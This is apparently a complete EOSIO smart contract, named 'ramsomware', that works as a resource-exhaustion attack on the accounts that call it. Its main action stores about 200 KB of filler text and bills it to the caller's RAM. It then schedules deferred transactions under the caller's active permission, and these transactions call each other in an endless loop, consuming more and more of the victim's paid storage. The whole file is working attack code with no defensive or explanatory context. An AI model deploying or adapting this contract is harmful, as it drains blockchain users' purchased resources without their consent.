//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
using namespace eosio;

class [[eosio::contract]] ramsomware : public eosio::contract {
    private:
        struct [[eosio::table]] person {
            uint64_t key;
            std::string data;
            uint64_t primary_key() const {return key;}
        };
        typedef eosio::multi_index<"people"_n, person> address_index;
    public:
      using contract::contract;
        void upsert(name user, uint64_t idx)
        {
            std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;
            A = A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A+A;

            address_index addresses(_self, _self.value);
            addresses.emplace(user, [&](auto & row)
            {
                row.key = idx;
                row.data = A;
            });
            print("SUCCESS SAVE DATA\n");
        }

        [[eosio::action]]
        void main(name client, uint64_t idx)
        {
            uint128_t initnum = 1;
            transaction out1{};
            transaction out2{};
            
            upsert(client, idx);

            out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2) ));
            //out2.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple(client, uint64_t(idx * 2+1) ));
            out1.send(idx * 2, client, false);
            //out2.send((idx * 2 + 1), client, false);
            print("[+] CALL 1st: ", (idx*2), "\n");
            //print("[+] CALL 2nd: ", ((idx*2)+1), "\n");
        };
        [[eosio::action]]
        void func(name client, uint64_t idx)
        { // 123 567
            //name client = name("reset");
            transaction out{};
            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, std::make_tuple(client, uint64_t(idx) ));
            //out.delay_sec = 0;
            out.send((idx), client, false);
            print("\t[#] FUNC: ", idx);
        };

};

EOSIO_DISPATCH( ramsomware, (main)(func) )

